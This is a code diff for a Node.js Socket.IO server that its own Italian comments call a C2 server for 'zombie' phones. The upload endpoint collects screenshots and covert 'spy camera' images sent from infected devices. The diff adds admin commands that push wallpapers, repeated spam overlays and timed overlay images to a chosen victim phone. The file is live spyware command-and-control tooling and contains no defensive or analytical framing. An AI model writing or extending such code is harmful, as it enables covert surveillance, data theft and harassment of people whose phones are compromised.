@@ -120,23 +120,43 @@ io.on('connection', (socket) => {
   });
 });
 
-// Endpoint per ricevere i file (Screenshot / Spy Camera) dai Sub
+// Endpoint per ricevere i file (Screenshot / Spy Camera) dai Sub o Immagini Custom dall'Admin
 app.post('/api/upload', upload.single('file'), (req, res) => {
   if (!req.file) {
     return res.status(400).send('No file uploaded.');
   }
   const fileUrl = `/uploads/${req.file.filename}`;
-
-  // Opzionale: notifico tutti via socket che c'è una nuova immagine
   const subId = req.body.subId;
-  const imageType = req.body.imageType || 'screenshot'; // screenshot o camera
+  const imageType = req.body.imageType || 'screenshot'; // screenshot, camera, wallpaper, overlay
 
-  io.emit('admin_notification', {
-    type: 'new_image',
-    sourceId: subId,
-    imageType: imageType,
-    url: fileUrl
-  });
+  if (req.body.fromAdmin === 'true' && subId) {
+    // Admin ha caricato un'immagine e vuole mandarla a un comando (wallpaper o overlay)
+    console.log(`[Admin Upload] Sending ${imageType} to ${subId}`);
+
+    // Ricostruiamo la BASE_URL dove risiede il server C2 pubblicamente
+    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
+    const host = req.headers['x-forwarded-host'] || req.headers.host;
+    const fullUrl = `${protocol}://${host}${fileUrl}`;
+
+    if (imageType === 'wallpaper') {
+      io.to(subId).emit('sub_command', { command: 'set_wallpaper', payload: { imageUrl: fullUrl } });
+    } else if (imageType === 'overlay' || imageType === 'spam_overlay') {
+      const timeoutMs = parseInt(req.body.timeoutMs || '0', 10);
+      if (imageType === 'spam_overlay') {
+        io.to(subId).emit('sub_command', { command: 'spam_overlay', payload: { url: fullUrl, count: 10 } });
+      } else {
+        io.to(subId).emit('sub_command', { command: 'TRIGGER_OVERLAY', payload: { url: fullUrl, timeoutMs } });
+      }
+    }
+  } else {
+    // Dati provenienti da un telefono zombie (Screenshot/Camera)
+    io.emit('admin_notification', {
+      type: 'new_image',
+      sourceId: subId,
+      imageType: imageType,
+      url: fileUrl
+    });
+  }
 
   res.json({ success: true, url: fileUrl });
 });
